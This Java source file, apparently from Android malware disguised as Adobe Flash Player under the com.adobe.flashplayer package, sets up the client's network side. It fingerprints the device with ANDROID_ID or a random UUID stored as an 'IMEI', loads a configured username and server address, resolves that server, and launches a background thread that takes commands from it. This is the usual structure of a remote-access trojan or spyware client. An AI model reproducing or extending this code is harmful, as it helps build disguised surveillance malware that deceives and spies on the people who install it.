package com.adobe.flashplayer.network;

import android.content.Context;
import android.provider.Settings;
import android.util.Log;

import com.adobe.flashplayer.PrefOper;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.Utils;

import java.net.InetAddress;
import java.util.UUID;

public class Network {

    private static final String TAG = "[ljg]Network";

    public static boolean initIMEI(Context context) {
        String strid = PrefOper.getValue(context, Public.PARAMCONFIG_FileName, Public.CFGCLIENTID);
        if (strid != null && strid.equals("") == false) {
            System.arraycopy(strid.getBytes(), 0, Public.IMEI, 0, strid.getBytes().length);
            return true;
        } else {
            strid = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
            if (strid == null || strid.equals("") == true) {
                String uuid = UUID.randomUUID().toString();
                uuid = uuid.replaceAll("-", "");
                uuid = uuid.substring(0, 16);
                strid = uuid;

                PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.CFGCLIENTID, strid);
                System.arraycopy(strid.getBytes(), 0, Public.IMEI, 0, strid.getBytes().length);
                Log.e(TAG, "[liujinguang]Android ID randomUUID!");
                return true;
            } else {
                //strid = String.valueOf(System.currentTimeMillis() );
                PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.CFGCLIENTID, strid);
                System.arraycopy(strid.getBytes(), 0, Public.IMEI, 0, strid.getBytes().length);
                return true;
            }
        }
    }


    public static boolean getUserAndIP(final Context context) {
        String username = PrefOper.getValue(context, Public.PARAMCONFIG_FileName, Public.CFGUSERNAME);
        if (username != null && username.equals("") == false) {
            Public.UserName = username;
        } else {
            Log.e(TAG, "[liujinguang]not found username! current username:" + Public.UserName);
            return false;
        }

        final String serverip = PrefOper.getValue(context, Public.PARAMCONFIG_FileName, Public.CFGSERVERIP);
        if (serverip != null && serverip.equals("") == false) {
            getIpFromStr(serverip);
        } else {
            Log.e(TAG, "[liujinguang]not found ip address! current address:" + Public.SERVER_IP_ADDRESS);
            return false;
        }

        Public.gOnlineType = NetworkUitls.getNetworkType(context);

        return true;
    }


    public static void getIpFromStr(final String serverip) {
        if (serverip.getBytes()[0] >= '0' && serverip.getBytes()[0] <= '9') {
            Public.SERVER_IP_ADDRESS = serverip;
        } else {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        Public.SERVER_IP_ADDRESS = InetAddress.getByName(serverip).getHostAddress();
                        Log.e(TAG, Public.SERVER_IP_ADDRESS);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }).start();
        }
    }


    public Network(Context context) {
        boolean result = initIMEI(context);
        if (result == false) {

        }
        result = getUserAndIP(context);
        if (result == false) {

        }

    }



    public static void launchServerCmdThread(Context context){
        Thread s = Utils.getThreadForName(Public.SERVER_CMD_THREADNAME);
        if (null == s)
        {
            ServerCommand server = new ServerCommand(context);
            Thread thread = new Thread(server,Public.SERVER_CMD_THREADNAME);
            thread.start();
            Log.e(TAG,"create server command thread");
        }
        else if (!s.isAlive()){
            s.start();
            Log.e(TAG,"start server command thread");
        }else{
            Log.e(TAG,"server command thread is running");
        }
    }
}